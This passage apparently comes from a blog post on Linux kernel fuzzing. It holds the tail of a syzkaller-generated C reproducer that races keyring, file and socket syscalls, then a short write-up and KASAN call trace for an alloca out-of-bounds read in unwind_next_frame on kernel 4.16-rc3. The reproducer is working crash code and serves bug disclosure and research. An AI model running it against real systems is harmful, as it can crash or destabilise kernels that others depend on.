	if (!tmpdir)
		fail("failed to mkdtemp");
	if (chmod(tmpdir, 0777))
		fail("failed to chmod");
	if (chdir(tmpdir))
		fail("failed to chdir");
}

static void vsnprintf_check(char* str, size_t size, const char* format, va_list args)
{
	int rv;

	rv = vsnprintf(str, size, format, args);
	if (rv < 0)
		fail("tun: snprintf failed");
	if ((size_t)rv >= size)
		fail("tun: string '%s...' doesn't fit into buffer", str);
}

static void snprintf_check(char* str, size_t size, const char* format, ...)
{
	va_list args;

	va_start(args, format);
	vsnprintf_check(str, size, format, args);
	va_end(args);
}

#define COMMAND_MAX_LEN 128
#define PATH_PREFIX "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin "
#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)

static void execute_command(bool panic, const char* format, ...)
{
	va_list args;
	char command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];
	int rv;

	va_start(args, format);
	memcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);
	vsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);
	rv = system(command);
	if (panic && rv != 0)
		fail("tun: command \"%s\" failed with code %d", &command[0], rv);

	va_end(args);
}

static int tunfd = -1;
static int tun_frags_enabled;

#define SYZ_TUN_MAX_PACKET_SIZE 1000

#define TUN_IFACE "syz_tun"

#define LOCAL_MAC "aa:aa:aa:aa:aa:aa"
#define REMOTE_MAC "aa:aa:aa:aa:aa:bb"

#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"

#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010
#define IFF_NAPI_FRAGS 0x0020

static void initialize_tun(void)
{
	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (tunfd == -1) {
		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
		printf("otherwise fuzzing or reproducing might not work as intended\n");
		return;
	}
	const int kTunFd = 252;
	if (dup2(tunfd, kTunFd) < 0)
		fail("dup2(tunfd, kTunFd) failed");
	close(tunfd);
	tunfd = kTunFd;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;
	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
		ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
		if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)
			fail("tun: ioctl(TUNSETIFF) failed");
	}
	if (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)
		fail("tun: ioctl(TUNGETIFF) failed");
	tun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;

	execute_command(1, "sysctl -w net.ipv6.conf.%s.accept_dad=0", TUN_IFACE);

	execute_command(1, "sysctl -w net.ipv6.conf.%s.router_solicitations=0", TUN_IFACE);

	execute_command(1, "ip link set dev %s address %s", TUN_IFACE, LOCAL_MAC);
	execute_command(1, "ip addr add %s/24 dev %s", LOCAL_IPV4, TUN_IFACE);
	execute_command(1, "ip -6 addr add %s/120 dev %s", LOCAL_IPV6, TUN_IFACE);
	execute_command(1, "ip neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV4, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip -6 neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV6, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip link set dev %s up", TUN_IFACE);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02hx"
#define DEV_MAC "aa:aa:aa:aa:aa:%02hx"

static void initialize_netdevices(void)
{
	unsigned i;
	const char* devtypes[] = {"ip6gretap", "bridge", "vcan", "bond", "veth"};
	const char* devnames[] = {"lo", "sit0", "bridge0", "vcan0", "tunl0",
				  "gre0", "gretap0", "ip_vti0", "ip6_vti0",
				  "ip6tnl0", "ip6gre0", "ip6gretap0",
				  "erspan0", "bond0", "veth0", "veth1"};

	for (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)
		execute_command(0, "ip link add dev %s0 type %s", devtypes[i], devtypes[i]);
	execute_command(0, "ip link add dev veth1 type veth");
	for (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {
		char addr[32];
		snprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);
		execute_command(0, "ip -4 addr add %s/24 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);
		execute_command(0, "ip -6 addr add %s/120 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);
		execute_command(0, "ip link set dev %s address %s", devnames[i], addr);
		execute_command(0, "ip link set dev %s up", devnames[i]);
	}
}

static int read_tun(char* data, int size)
{
	if (tunfd < 0)
		return -1;

	int rv = read(tunfd, data, size);
	if (rv < 0) {
		if (errno == EAGAIN)
			return -1;
		if (errno == EBADFD)
			return -1;
		fail("tun: read failed with %d", rv);
	}
	return rv;
}

static void flush_tun()
{
	char data[SYZ_TUN_MAX_PACKET_SIZE];
	while (read_tun(&data[0], sizeof(data)) != -1)
		;
}

static void loop();

static void sandbox_common()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	setsid();

	struct rlimit rlim;
	rlim.rlim_cur = rlim.rlim_max = 128 << 20;
	setrlimit(RLIMIT_AS, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 8 << 20;
	setrlimit(RLIMIT_MEMLOCK, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
	setrlimit(RLIMIT_FSIZE, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
	setrlimit(RLIMIT_STACK, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 0;
	setrlimit(RLIMIT_CORE, &rlim);

#define CLONE_NEWCGROUP 0x02000000

	if (unshare(CLONE_NEWNS)) {
	}
	if (unshare(CLONE_NEWIPC)) {
	}
	if (unshare(CLONE_NEWCGROUP)) {
	}
	if (unshare(CLONE_NEWUTS)) {
	}
	if (unshare(CLONE_SYSVSEM)) {
	}
}

static int do_sandbox_setuid(void)
{
	if (unshare(CLONE_NEWPID))
		fail("unshare(CLONE_NEWPID)");
	int pid = fork();
	if (pid < 0)
		fail("sandbox fork failed");
	if (pid)
		return pid;

	sandbox_common();
	if (unshare(CLONE_NEWNET))
		fail("unshare(CLONE_NEWNET)");
	initialize_tun();
	initialize_netdevices();

	const int nobody = 65534;
	if (setgroups(0, NULL))
		fail("failed to setgroups");
	if (syscall(SYS_setresgid, nobody, nobody, nobody))
		fail("failed to setresgid");
	if (syscall(SYS_setresuid, nobody, nobody, nobody))
		fail("failed to setresuid");

	prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);

	loop();
	doexit(1);
}

#define XT_TABLE_SIZE 1536
#define XT_MAX_ENTRIES 10

struct xt_counters {
	uint64_t pcnt, bcnt;
};

struct ipt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_entries;
	unsigned int size;
};

struct ipt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct ipt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct ipt_table_desc {
	const char* name;
	struct ipt_getinfo info;
	struct ipt_replace replace;
};

static struct ipt_table_desc ipv4_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

static struct ipt_table_desc ipv6_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

#define IPT_BASE_CTL 64
#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)
#define IPT_SO_GET_INFO (IPT_BASE_CTL)
#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)

struct arpt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_entries;
	unsigned int size;
};

struct arpt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct arpt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct arpt_table_desc {
	const char* name;
	struct arpt_getinfo info;
	struct arpt_replace replace;
};

static struct arpt_table_desc arpt_tables[] = {
    {.name = "filter"},
};

#define ARPT_BASE_CTL 96
#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)
#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)
#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)

static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct ipt_get_entries entries;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(IPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(IPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct ipt_get_entries entries;
	struct ipt_getinfo info;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(IPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(IPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(IPT_SO_SET_REPLACE)");
	}
	close(fd);
}

static void checkpoint_arptables(void)
{
	struct arpt_get_entries entries;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(ARPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(ARPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_arptables()
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct arpt_get_entries entries;
	struct arpt_getinfo info;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(ARPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(ARPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(ARPT_SO_SET_REPLACE)");
	}
	close(fd);
}
#include <linux/if.h>
#include <linux/netfilter_bridge/ebtables.h>

struct ebt_table_desc {
	const char* name;
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
};

static struct ebt_table_desc ebt_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "broute"},
};

static void checkpoint_ebtables(void)
{
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(EBT_SO_GET_INIT_INFO)");
		}
		if (table->replace.entries_size > sizeof(table->entrytable))
			fail("table size is too large: %u", table->replace.entries_size);
		table->replace.num_counters = 0;
		table->replace.entries = table->entrytable;
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INIT_ENTRIES)");
	}
	close(fd);
}

static void reset_ebtables()
{
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
	socklen_t optlen;
	unsigned i, j, h;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		if (table->replace.valid_hooks == 0)
			continue;
		memset(&replace, 0, sizeof(replace));
		strcpy(replace.name, table->name);
		optlen = sizeof(replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INFO)");
		replace.num_counters = 0;
		for (h = 0; h < NF_BR_NUMHOOKS; h++)
			table->replace.hook_entry[h] = 0;
		if (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {
			memset(&entrytable, 0, sizeof(entrytable));
			replace.entries = entrytable;
			optlen = sizeof(replace) + replace.entries_size;
			if (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))
				fail("getsockopt(EBT_SO_GET_ENTRIES)");
			if (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)
				continue;
		}
		for (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {
			if (table->replace.valid_hooks & (1 << h)) {
				table->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;
				j++;
			}
		}
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))
			fail("setsockopt(EBT_SO_SET_ENTRIES)");
	}
	close(fd);
}

static void checkpoint_net_namespace(void)
{
	checkpoint_ebtables();
	checkpoint_arptables();
	checkpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	checkpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void reset_net_namespace(void)
{
	reset_ebtables();
	reset_arptables();
	reset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	reset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void remove_dir(const char* dir)
{
	DIR* dp;
	struct dirent* ep;
	int iter = 0;
retry:
	dp = opendir(dir);
	if (dp == NULL) {
		if (errno == EMFILE) {
			exitf("opendir(%s) failed due to NOFILE, exiting", dir);
		}
		exitf("opendir(%s) failed", dir);
	}
	while ((ep = readdir(dp))) {
		if (strcmp(ep->d_name, ".") == 0 || strcmp(ep->d_name, "..") == 0)
			continue;
		char filename[FILENAME_MAX];
		snprintf(filename, sizeof(filename), "%s/%s", dir, ep->d_name);
		struct stat st;
		if (lstat(filename, &st))
			exitf("lstat(%s) failed", filename);
		if (S_ISDIR(st.st_mode)) {
			remove_dir(filename);
			continue;
		}
		int i;
		for (i = 0;; i++) {
			if (unlink(filename) == 0)
				break;
			if (errno == EROFS) {
				break;
			}
			if (errno != EBUSY || i > 100)
				exitf("unlink(%s) failed", filename);
			if (umount2(filename, MNT_DETACH))
				exitf("umount(%s) failed", filename);
		}
	}
	closedir(dp);
	int i;
	for (i = 0;; i++) {
		if (rmdir(dir) == 0)
			break;
		if (i < 100) {
			if (errno == EROFS) {
				break;
			}
			if (errno == EBUSY) {
				if (umount2(dir, MNT_DETACH))
					exitf("umount(%s) failed", dir);
				continue;
			}
			if (errno == ENOTEMPTY) {
				if (iter < 100) {
					iter++;
					goto retry;
				}
			}
		}
		exitf("rmdir(%s) failed", dir);
	}
}

static void test();

void loop()
{
	int iter;
	checkpoint_net_namespace();
	for (iter = 0;; iter++) {
		char cwdbuf[256];
		sprintf(cwdbuf, "./%d", iter);
		if (mkdir(cwdbuf, 0777))
			fail("failed to mkdir");
		int pid = fork();
		if (pid < 0)
			fail("loop fork failed");
		if (pid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
			setpgrp();
			if (chdir(cwdbuf))
				fail("failed to chdir");
			flush_tun();
			test();
			doexit(0);
		}
		int status = 0;
		uint64_t start = current_time_ms();
		for (;;) {
			int res = waitpid(-1, &status, __WALL | WNOHANG);
			if (res == pid)
				break;
			usleep(1000);
			if (current_time_ms() - start > 5 * 1000) {
				kill(-pid, SIGKILL);
				kill(pid, SIGKILL);
				while (waitpid(-1, &status, __WALL) != pid) {
				}
				break;
			}
		}
		remove_dir(cwdbuf);
		reset_net_namespace();
	}
}

struct thread_t {
	int created, running, call;
	pthread_t th;
};

static struct thread_t threads[16];
static void execute_call(int call);
static int running;
static int collide;

static void* thr(void* arg)
{
	struct thread_t* th = (struct thread_t*)arg;
	for (;;) {
		while (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE))
			syscall(SYS_futex, &th->running, FUTEX_WAIT, 0, 0);
		execute_call(th->call);
		__atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
		__atomic_store_n(&th->running, 0, __ATOMIC_RELEASE);
		syscall(SYS_futex, &th->running, FUTEX_WAKE);
	}
	return 0;
}

static void execute(int num_calls)
{
	int call, thread;
	running = 0;
	for (call = 0; call < num_calls; call++) {
		for (thread = 0; thread < sizeof(threads) / sizeof(threads[0]); thread++) {
			struct thread_t* th = &threads[thread];
			if (!th->created) {
				th->created = 1;
				pthread_attr_t attr;
				pthread_attr_init(&attr);
				pthread_attr_setstacksize(&attr, 128 << 10);
				pthread_create(&th->th, &attr, thr, th);
			}
			if (!__atomic_load_n(&th->running, __ATOMIC_ACQUIRE)) {
				th->call = call;
				__atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
				__atomic_store_n(&th->running, 1, __ATOMIC_RELEASE);
				syscall(SYS_futex, &th->running, FUTEX_WAKE);
				if (collide && call % 2)
					break;
				struct timespec ts;
				ts.tv_sec = 0;
				ts.tv_nsec = 20 * 1000 * 1000;
				syscall(SYS_futex, &th->running, FUTEX_WAIT, 1, &ts);
				if (running)
					usleep((call == num_calls - 1) ? 10000 : 1000);
				break;
			}
		}
	}
}

uint64_t r[2] = {0x0, 0xffffffffffffffff};
uint64_t procid;
void execute_call(int call)
{
	long res;	switch (call) {
	case 0:
memcpy((void*)0x20000440, "keyring", 8);
*(uint8_t*)0x20000480 = 0x73;
*(uint8_t*)0x20000481 = 0x79;
*(uint8_t*)0x20000482 = 0x7a;
*(uint8_t*)0x20000483 = 0;
*(uint8_t*)0x20000484 = 0;
		res = syscall(__NR_add_key, 0x20000440, 0x20000480, 0, 0, 0xfffffffe);
		if (res != -1)
				r[0] = res;
		break;
	case 1:
		syscall(__NR_keyctl, 9, r[0], r[0]);
		break;
	case 2:
memcpy((void*)0x20000000, "/selinux/enforce", 17);
		res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000000, 2, 0);
		if (res != -1)
				r[1] = res;
		break;
	case 3:
		syscall(__NR_ioctl, r[1], 0x8904, 0x20000040);
		break;
	case 4:
*(uint32_t*)0x20000280 = 8;
		syscall(__NR_getpeername, r[1], 0x20000240, 0x20000280);
		break;
	case 5:
*(uint32_t*)0x20000340 = 4;
		syscall(__NR_getsockopt, r[1], 0, 0xc, 0x20000300, 0x20000340);
		break;
	}
}

void test()
{
	execute(6);
	collide = 1;
	execute(6);
}

int main()
{
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	char *cwd = get_current_dir_name();
	for (procid = 0; procid < 8; procid++) {
		if (fork() == 0) {
			for (;;) {
				if (chdir(cwd))
					fail("failed to chdir");
				use_temporary_dir();
				int pid = do_sandbox_setuid();
				int status = 0;
				while (waitpid(pid, &status, __WALL) != pid) {}
			}
		}
	}
	sleep(1000000);
	return 0;
}

```

## unwind_next_frame - alloca Out Of Bounds

Got from syzkaller & Found in LK v4.16.0-rc3. But it's not useful info. As before, there's a similar bug that I found.
As committer said, this bug is natural and of course not useful stuff.

*link* : [unwind_orc-out_of_bounds](https://kozistr.github.io/2017/12/16/LK-unwind_orc-oob.html)

### Call Trace (Dump)

```c
[  163.982226] ==================================================================
[  163.984549] BUG: KASAN: alloca-out-of-bounds in unwind_next_frame+0x18a0/0x1920
[  163.986378] Read of size 8 at addr ffff88005a9878c0 by task poc/2752
[  163.987829] 
[  163.988229] CPU: 0 PID: 2752 Comm: poc Not tainted 4.16.0-rc3+ #6
[  163.989674] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  163.991730] Call Trace:
[  163.992180]  <IRQ>
[  163.992518]  dump_stack+0xd7/0x154
[  163.993118]  ? unwind_next_frame+0x18a0/0x1920
[  163.994093]  print_address_description+0x60/0x22b
[  163.995264]  ? unwind_next_frame+0x18a0/0x1920
[  163.996411]  kasan_report.cold.6+0xac/0x2f4
[  163.997455]  ? unwind_next_frame+0x18a0/0x1920
[  163.998528]  ? apic_timer_interrupt+0xf/0x20
[  163.999557]  ? deref_stack_reg+0xe0/0xe0
[  164.000293]  ? apic_timer_interrupt+0xf/0x20
[  164.001134]  ? __save_stack_trace+0x7d/0xf0
[  164.001962]  ? __memset+0x29/0x30
[  164.002616]  ? save_stack+0x32/0xb0
[  164.003298]  ? __kasan_slab_free+0x12c/0x170
[  164.004129]  ? kmem_cache_free+0xc1/0x300
[  164.004906]  ? rcu_process_callbacks+0x814/0x1dc0
[  164.005807]  ? __do_softirq+0x213/0x915
[  164.006545]  ? irq_exit+0x1a2/0x1d0
[  164.007272]  ? smp_apic_timer_interrupt+0xf1/0x500
[  164.008520]  ? apic_timer_interrupt+0xf/0x20
[  164.009794]  ? debug_check_no_locks_freed+0x210/0x210
[  164.011065]  ? debug_check_no_locks_freed+0x210/0x210
[  164.012342]  ? find_held_lock+0x33/0x1c0
[  164.013289]  ? mark_held_locks+0xc1/0x140
[  164.014098]  ? kmem_cache_free+0x152/0x300
[  164.014998]  ? __kasan_slab_free+0x12c/0x170
[  164.015695]  ? rcu_process_callbacks+0x814/0x1dc0
[  164.016483]  ? kmem_cache_free+0xc1/0x300
[  164.017174]  ? get_object+0x80/0x80
[  164.018026]  ? rcu_process_callbacks+0x814/0x1dc0
[  164.018974]  ? note_gp_changes+0x1e0/0x1e0
[  164.019836]  ? __do_softirq+0x213/0x915
[  164.020656]  ? irq_exit+0x1a2/0x1d0
[  164.021375]  ? smp_apic_timer_interrupt+0xf1/0x500
[  164.022346]  ? apic_timer_interrupt+0xf/0x20
[  164.023225]  </IRQ>
[  164.023716]  ? __memset+0x29/0x30
[  164.024397]  ? debug_check_no_locks_freed+0x210/0x210
[  164.025396]  ? kasan_unpoison_shadow+0x30/0x40
[  164.026288]  ? crypto_shash_update+0x24d/0x2a0
[  164.027278]  ? ext4_inode_csum.isra.60+0x2f1/0x8f0
[  164.028043]  ? ext4_journalled_zero_new_buffers+0x410/0x410
[  164.028987]  ? from_kprojid+0x89/0xc0
[  164.029601]  ? ext4_inode_csum_set+0x1ad/0x3c0
[  164.030653]  ? ext4_mark_iloc_dirty+0x1616/0x2a50
[  164.031704]  ? ext4_chunk_trans_blocks+0x20/0x20
[  164.032557]  ? __ext4_journal_get_write_access+0x143/0x200
[  164.033437]  ? ext4_mark_inode_dirty+0x204/0x890
[  164.034234]  ? ext4_rmdir+0x7e2/0xc10
[  164.035128]  ? ext4_expand_extra_isize+0x500/0x500
[  164.035921]  ? mark_held_locks+0xc1/0x140
[  164.036648]  ? timespec_trunc+0xea/0x180
[  164.037294]  ? current_kernel_time64+0x120/0x140
[  164.038016]  ? ext4_rmdir+0x7e2/0xc10
[  164.038616]  ? ext4_rename2+0x210/0x210
[  164.039262]  ? vfs_rmdir+0x24c/0x470
[  164.039917]  ? do_rmdir+0x364/0x420
[  164.040687]  ? user_path_create+0x40/0x40
[  164.041628]  ? _raw_spin_unlock_irq+0x24/0x40
[  164.042456]  ? _raw_spin_unlock_irq+0x24/0x40
[  164.043311]  ? task_work_run+0x113/0x1c0
[  164.044071]  ? do_syscall_64+0x43/0x6b0
[  164.044841]  ? SyS_mkdir+0x260/0x260
[  164.045598]  ? do_syscall_64+0x1b7/0x6b0
[  164.046418]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7
[  164.047648] 
[  164.047971] The buggy address belongs to the page:
[  164.048763] page:ffffea00016a61c0 count:0 mapcount:0 mapping:0000000000000000 index:0x0
[  164.050054] flags: 0x100000000000000()
[  164.050648] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
[  164.051948] raw: 0000000000000000 ffffea00016a61e0 0000000000000000 0000000000000000
[  164.053383] page dumped because: kasan: bad access detected
[  164.054483] 
[  164.054732] Memory state around the buggy address:
